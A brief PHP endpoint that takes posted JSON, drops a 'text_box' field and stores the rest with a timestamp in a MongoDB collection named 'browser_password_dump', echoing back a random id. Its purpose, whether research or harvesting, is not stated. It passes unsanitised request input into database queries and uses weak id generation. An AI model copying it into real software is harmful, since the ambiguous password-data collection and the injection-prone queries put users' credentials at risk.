<?php

$analysis_data = json_decode(file_get_contents("php://input"), true);
unset($analysis_data['text_box']);

$m = new MongoClient();
$db = $m->password_analysis;
$collection = $db->browser_password_dump;

$analysis_data['timestamp'] = time();

if(isset($_GET['id'])) {
	$count = $collection->count(
		array('id' => $_GET['id'])
	);
	if ($count > 0) {
		$collection->update(
			array('id' => $_GET['id']),
			array(
				'$push' => array('content' => $analysis_data)
			)
		);
	}
	return;
}

$final_analysis_data = array();

$length = 20;
$id = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
$final_analysis_data['id'] = $id;
$final_analysis_data['content'] = array($analysis_data);

$collection->insert($final_analysis_data);

echo $id;
